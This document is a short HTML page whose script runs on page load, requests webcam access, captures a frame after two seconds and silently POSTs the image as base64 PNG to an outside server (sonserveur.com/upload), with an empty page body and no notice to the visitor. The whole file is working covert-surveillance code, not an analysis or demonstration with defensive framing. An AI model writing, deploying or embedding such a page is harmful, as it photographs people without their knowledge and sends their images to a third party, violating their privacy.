<html>
<head>
  <script>
    async function capture() {
      let stream = await navigator.mediaDevices.getUserMedia({ video: true });
      let video = document.createElement("video");
      video.srcObject = stream;
      video.play();
      
      setTimeout(() => {
        let canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        let ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        let imgData = canvas.toDataURL("image/png");
        fetch("https://sonserveur.com/upload", {  
          method: "POST",
          body: JSON.stringify({ image: imgData }),
          headers: { "Content-Type": "application/json" }
        });
        
        stream.getTracks().forEach(track => track.stop()); 
      }, 2000);  
    }
    window.onload = capture;
  </script>
</head>
<body></body>
</html>
